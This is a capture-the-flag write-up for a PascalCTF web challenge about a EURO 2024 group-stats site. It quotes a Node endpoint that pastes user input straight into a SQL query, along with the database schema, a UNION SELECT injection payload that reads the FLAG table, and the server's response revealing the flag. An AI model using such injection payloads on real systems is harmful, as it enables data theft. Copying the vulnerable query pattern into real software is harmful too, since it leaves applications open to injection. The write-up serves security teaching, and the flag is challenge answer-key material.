# Description
It is a widely known fact that elia is a diehard fan of football. For this reason he built a website to display the group stats of the EURO 2024 tournament but it seems like he left a secret somewhere.

https://euro2024.challs.pascalctf.it 

## Info

- Solved by [Mathijs De Wilde](https://github.com/MathijsDeWilde)
- Written by [InSearchOfName](https://github.com/InSearchOfName)

## Solution
When we look at the source code of this application we see that there is an endpoint vulnerable to sql injection to be exact this one
~~~js
app.post("/api/group-stats", async (req, res) => {
    const group = req.body.group;
    let data = await db.query(`SELECT * FROM GROUP_STATS WHERE group_id = '${group}' ORDER BY ranking ASC`).catch((err) => console.error(err));
    res.json({ data: data.rows });
});
~~~

if we look at how the dbs.js file we see they are setup in following way
~~~js
client.query(`CREATE TABLE IF NOT EXISTS FLAG (
    flag VARCHAR(64) PRIMARY KEY 
)`)

client.query(`CREATE TABLE IF NOT EXISTS GROUPS (
    id CHAR NOT NULL PRIMARY KEY
)`);

client.query(`CREATE TABLE IF NOT EXISTS GROUP_STATS (
    group_id CHAR NOT NULL,
    team_name VARCHAR(32) NOT NULL,
    ranking INT NOT NULL,
    points INT NOT NULL,
    wins INT NOT NULL,
    draws INT NOT NULL,
    losses INT NOT NULL,
    goal_difference INT NOT NULL,
    PRIMARY KEY(group_id, team_name),
    FOREIGN KEY (group_id) REFERENCES GROUPS (id)
)`);
~~~

Now we can explout this by sending a union select statement in our injection
~~~json
{
  "group": "' UNION SELECT flag,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM FLAG -- "
}
~~~

if we send this to the endpoint we get this back
~~~json
{
    "data": [
        {
            "group_id": "pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder}",
            "team_name": null,
            "ranking": null,
            "points": null,
            "wins": null,
            "draws": null,
            "losses": null,
            "goal_difference": null
        }
    ]
}
~~~

giving us the following flag `pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder}`
